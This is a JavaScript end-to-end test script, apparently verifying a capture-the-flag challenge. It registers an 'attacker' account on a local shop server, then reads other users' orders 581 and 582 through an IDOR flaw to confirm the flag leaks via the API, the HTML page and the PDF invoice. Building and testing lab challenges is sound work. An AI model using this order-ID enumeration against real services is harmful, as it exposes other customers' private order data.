// e2e verification: register → login → create order → IDOR 581→582
const BASE = "http://127.0.0.1:8787";
const email = `attacker_${Date.now()}@example.com`;
const pass = "Attacker123!";
let cookie = "";

async function waitUp() {
  for (let i = 0; i < 40; i++) {
    try {
      const r = await fetch(BASE + "/api/products");
      if (r.ok) return;
    } catch {}
    await new Promise((r) => setTimeout(r, 1500));
  }
  throw new Error("server not up");
}
function grabCookie(res) {
  const sc = res.headers.get("set-cookie");
  if (sc) cookie = sc.split(";")[0];
}
function hdr(extra = {}) {
  return { "Content-Type": "application/json", ...(cookie ? { Cookie: cookie } : {}), ...extra };
}
async function main() {
  await waitUp();
  console.log("UP");
  // 1. register
  let r = await fetch(BASE + "/api/register", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Attacker", email, password: pass }),
  });
  console.log("register:", r.status);
  grabCookie(r);
  if (r.status !== 201) throw new Error("register failed: " + (await r.text()));
  // 2. products
  r = await fetch(BASE + "/api/products");
  const prods = await r.json();
  console.log("products:", prods.products.length);
  // 3. create order (checkout)
  r = await fetch(BASE + "/api/orders", {
    method: "POST",
    headers: hdr(),
    body: JSON.stringify({
      items: [{ product_id: 7, qty: 1 }],
      shipping_name: "Attacker",
      shipping_phone: "0550000111",
      shipping_city: "الرياض",
      shipping_address: "حي الياسمين",
      notes: "",
    }),
  });
  const created = await r.json();
  console.log("create order:", r.status, JSON.stringify(created));
  if (r.status !== 201) throw new Error("checkout failed");
  const myId = created.order.id;
  // 4. own order OK
  r = await fetch(BASE + `/api/orders/${myId}`, { headers: hdr() });
  console.log("own order:", r.status);
  // 5. unauth blocked?
  const rNo = await fetch(BASE + "/api/orders/582");
  console.log("no-auth 582:", rNo.status, "(expect 401)");
  // 6. IDOR: 581 then 582
  r = await fetch(BASE + "/api/orders/581", { headers: hdr() });
  const b581 = await r.text();
  console.log("581:", r.status, "len=" + b581.length, "has-flag=" + b581.includes("SDC{"));
  r = await fetch(BASE + "/api/orders/582", { headers: hdr() });
  const b582 = await r.text();
  console.log("582:", r.status, "len=" + b582.length, "has-flag=" + b582.includes("SDC{"));
  const m = b582.match(/SDC\{[^}]+\}/);
  console.log("flag-in-582:", m ? m[0].slice(0, 12) + "..." : "NONE");
  // 7. HTML page + invoice
  r = await fetch(BASE + "/orders/582", { headers: { Cookie: cookie } });
  const h = await r.text();
  console.log("html /orders/582:", r.status, "has-flag=" + h.includes("SDC{"));
  r = await fetch(BASE + "/orders/582/invoice", { headers: { Cookie: cookie } });
  const buf = Buffer.from(await r.arrayBuffer());
  console.log("invoice:", r.status, r.headers.get("content-type"), "pdf-magic=" + buf.slice(0, 5).toString(), "has-flag=" + buf.includes("SDC{"));
  // 8. my orders list scoped (should NOT contain 582)
  r = await fetch(BASE + "/api/orders", { headers: hdr() });
  const mine = await r.json();
  console.log("my-orders-ids:", JSON.stringify(mine.orders.map((o) => o.id)), "leak582=" + JSON.stringify(mine).includes("582"));
  if (!m || r.status !== 200) throw new Error("E2E FAILED");
  console.log("E2E PASS");
}
main().catch((e) => {
  console.error("E2E FAIL:", e.message);
  process.exit(1);
});
